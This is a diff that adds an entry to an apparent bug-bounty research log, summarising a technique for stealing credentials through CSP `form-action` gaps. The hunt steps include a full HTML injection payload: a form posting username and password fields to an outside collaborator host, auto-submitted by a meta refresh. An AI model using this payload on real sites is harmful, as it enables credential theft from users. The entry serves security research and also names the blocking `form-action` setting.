@@ -3703,3 +3703,13 @@ A vulnerability was identified in the Japanese version of the pixiv dictionary w
 - **Rating:** variant
 
 ---
+
+## 2026-11-16 — Blind trust: stealing credentials through CSP
+
+### Blind trust: stealing credentials through CSP
+- **Date:** 2026-11-16 · **Source:** [portswigger.net](https://portswigger.net/research/blind-trust-stealing-credentials-through-csp) · **Class:** technique
+- **What:** Reflected HTML injection can steal credentials without JavaScript by abusing CSP's `form-action` not falling back to `default-src`; injecting a form pointing to an attacker-controlled origin + a `meta refresh` causes the browser to submit credentials with the page load, exfiltrating them in the `Referer` header.
+- **Why it matters:** Broad bounty impact — any app with reflected HTML injection + a CSP that doesn't restrict `form-action` is vulnerable regardless of `script-src`; bypasses most CSP-focused defenses.
+- **Hunt signal:** 1) Find reflected HTML injection (even stripped of `<script>`); 2) Check CSP header for missing or permissive `form-action`; 3) Inject `<form action="https://collaborator.net/x"><input name="username"><input name="password"></form><meta http-equiv="refresh" content="0">` and watch Collaborator for credential POST/Referer.
+- **Kill criterion:** Site sets `form-action 'none'` or `form-action 'self'` with no wildcard — submission is blocked and exfil fails.
+- **Evidence:** [PortSwigger Research, 2026-11-11](https://portswigger.net/research/blind-trust-stealing-credentials-through-csp)
